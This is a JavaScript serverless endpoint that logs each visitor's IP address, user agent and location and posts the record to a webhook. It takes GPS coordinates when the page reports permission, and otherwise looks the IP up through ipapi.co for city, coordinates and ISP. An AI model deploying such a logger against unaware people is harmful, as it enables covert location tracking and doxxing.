export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress;
    const ua = req.headers['user-agent'];
    const timestamp = new Date().toISOString();
    const body = req.body;

    let log = {
        timestamp,
        ip,
        user_agent: ua
    };

    if (body.geolocation_allowed) {
        log.location_type = "GPS";
        log.latitude = body.latitude;
        log.longitude = body.longitude;
        log.accuracy = body.accuracy;
    } else {
        try {
            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
            const geo = await geoRes.json();
            log.location_type = "IP Fallback";
            log.city = geo.city;
            log.region = geo.region;
            log.country = geo.country_name;
            log.latitude = geo.latitude;
            log.longitude = geo.longitude;
            log.org = geo.org;
        } catch (err) {
            log.location_type = "Unknown";
        }
    }

    const webhookUrl = "YOUR_WEBHOOK_URL_HERE";
    await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `📡 Visitor log:\n\`\`\`json\n${JSON.stringify(log, null, 2)}\n\`\`\``
        })
    });

    res.status(204).end();
}
